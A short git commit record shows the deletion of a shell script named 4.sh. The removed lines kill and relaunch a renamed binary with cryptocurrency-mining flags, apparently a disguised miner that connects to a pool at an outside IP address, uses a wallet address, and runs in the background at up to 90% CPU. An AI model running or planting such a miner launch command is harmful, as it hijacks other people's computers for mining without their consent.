85fbea0af2ce40ad01fa9e09410da4b0612e0e16
tokdok <51758635+tokdok@users.noreply.github.com>
2019-10-01 06:59:52 +0800

    Delete 4.sh

--- 4.sh
+++
@@ -1,3 +0,0 @@
-pkill defaultsoftwarename
-sleep 7
-defaultsoftwarename -o 81.22.45.66:53791 -u 4Aqy81L8Pcvi9vFxyaKWcoUD2a8XLYd3u9TMbWs6grPv4tXJVSjbEsAWK8NXTij9UZTCmcMwwLq9aLtugAjg2CeUD7hATJ9 --pass=x:waf_sw@vivaldi.net --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
